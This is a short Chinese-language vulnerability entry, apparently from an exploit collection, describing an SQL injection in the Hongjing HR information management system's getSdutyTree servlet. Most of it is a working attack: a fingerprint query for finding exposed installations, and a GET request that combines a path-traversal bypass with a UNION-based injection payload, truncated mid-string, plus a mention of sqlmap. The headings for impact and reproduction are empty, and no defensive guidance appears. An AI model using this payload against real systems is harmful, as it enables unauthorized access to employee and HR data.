# 宏景人力资源信息管理系统getSdutyTree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BC`

**请求体 / payload**
```
qxjpqjwUIWcKtHqhkYslITEIKSbtxYTRxTtXpWImhWfaMqvjzq
sqlmap
GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1 HTTP/1.1
Host:
```

**其他**
- 宏景人力资源信息管理系统getSdutyTree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统